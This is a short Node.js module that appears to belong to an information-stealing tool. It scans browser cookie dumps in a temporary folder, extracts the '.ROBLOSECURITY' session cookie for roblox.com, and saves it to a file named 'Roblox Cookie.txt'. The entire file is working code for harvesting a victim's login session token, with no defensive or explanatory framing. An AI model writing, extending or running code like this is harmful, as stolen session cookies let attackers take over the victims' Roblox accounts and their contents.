const { join } = require('path');
const fs = require('fs');
const { tempFolder } = require('../index');
const { searchForFile } = require('../util/dir');

fs.readdirSync(join(tempFolder, 'Browsers'))?.filter(f => f.split('.').length >= 1)?.forEach(async browser => {
  const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
  await searchForFile(file, 500);
  const line = fs.readFileSync(file)
    .toString().split('\n')
    .find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
  if (!line) return;
  const cookie = line.split(',')[2];
  fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
});
